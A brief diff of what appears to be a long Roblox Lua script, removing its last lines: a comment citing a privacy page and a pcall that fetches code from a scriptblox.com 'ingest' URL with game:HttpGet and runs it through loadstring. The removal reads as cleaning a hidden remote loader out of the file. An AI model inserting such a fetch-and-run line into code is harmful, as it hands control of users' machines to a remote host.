@@ -5325,6 +5325,3 @@ coroutine.wrap(ZUETYL_routine)()
 coroutine.wrap(MHQJ_routine)()
 coroutine.wrap(UNJJOCO_routine)()
 coroutine.wrap(ZBXBA_routine)()
-
--- https://scriptblox.com/privacy
-pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_e111863787f4", "1.21.6", false) end)
